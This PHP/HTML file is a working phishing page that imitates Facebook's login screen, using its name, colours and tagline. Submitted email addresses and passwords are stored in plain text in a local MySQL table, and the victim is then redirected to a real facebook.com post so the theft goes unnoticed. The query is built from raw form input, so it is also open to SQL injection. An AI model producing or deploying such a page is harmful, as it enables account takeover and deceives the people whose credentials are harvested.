<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="facebook.png" type="image/x-icon">
<title>facebook</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Helvetica, Arial, sans-serif;
}
body{
    background:#f0f2f5;
}
.wrapper{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}
.container{
    display:flex;
    justify-content:center;
    align-items:center;
    gap:80px;
    width:100%;
    max-width:1000px;
}
.left{
    flex:1;
}
.left h1{
    color:#1877f2;
    font-size:56px;
}
.left p{
    font-size:28px;
    margin-top:10px;
    line-height:32px;
}
.card{
    background:#fff;
    width:100%;
    max-width:396px;
    padding:20px;
    border-radius:8px;
    box-shadow:0 2px 10px rgba(0,0,0,0.15);
}
.card input{
    width:100%;
    padding:14px;
    margin-bottom:12px;
    border:1px solid #dddfe2;
    border-radius:6px;
    font-size:16px;
}
.card input:focus{
    outline:none;
    border-color:#1877f2;
    box-shadow:0 0 0 2px #e7f3ff;
}
.login-btn{
    width:100%;
    padding:14px;
    font-size:18px;
    font-weight:bold;
    background:#1877f2;
    color:#fff;
    border:none;
    border-radius:6px;
    cursor:pointer;
}
.login-btn:hover{
    background:#166fe5;
}
.forgot{
    display:block;
    text-align:center;
    margin:16px 0;
    font-size:14px;
    color:#1877f2;
    text-decoration:none;
}
.forgot:hover{
    text-decoration:underline;
}
.divider{
    border-top:1px solid #dadde1;
    margin:20px 0;
}
.create-btn{
    display:block;
    margin:0 auto;
    padding:14px 16px;
    font-size:16px;
    font-weight:bold;
    background:#42b72a;
    color:white;
    border:none;
    border-radius:6px;
    cursor:pointer;
}
.create-btn:hover{
    background:#36a420;
}
@media (max-width: 900px){

    .container{
        flex-direction:column;
        text-align:center;
        gap:40px;
    }

    .left h1{
        font-size:42px;
    }

    .left p{
        font-size:20px;
    }
}
@media (max-width: 400px){

    .left h1{
        font-size:34px;
    }

    .left p{
        font-size:16px;
    }

    .card{
        padding:15px;
    }
}

</style>
</head>

<body>

<?php

$servername = "localhost";
$username = "root";
$password = "";
$server = "Log_In";

$connection = mysqli_connect($servername, $username, $password, $server);

if(!$connection){
    echo "failed";
}
else{
    // echo "success";
}

?>


<div class="wrapper">
    <div class="container">

        <div class="left">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you.</p>
        </div>

        <div class="card">
            <form action="" method="POST">
                <input type="text" name="username" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button class="login-btn" type="submit">Log In</button>
            </form>

            <a href="#" class="forgot">Forgotten password?</a>

            <div class="divider"></div>

            <button class="create-btn">Create new account</button>
        </div>

    </div>
</div>

<?php


if(isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];

    
    $sql = "INSERT INTO Log_InTB(username,password) VALUES ('$username','$password')";
    if(mysqli_query($connection, $sql)){
        
        header("Location: https://www.facebook.com/share/p/1bq1NpdCST/"); 
        exit(); 
    }
    else{
        echo "Error: " . mysqli_error($connection);
    }
}
?>

</body>
</html>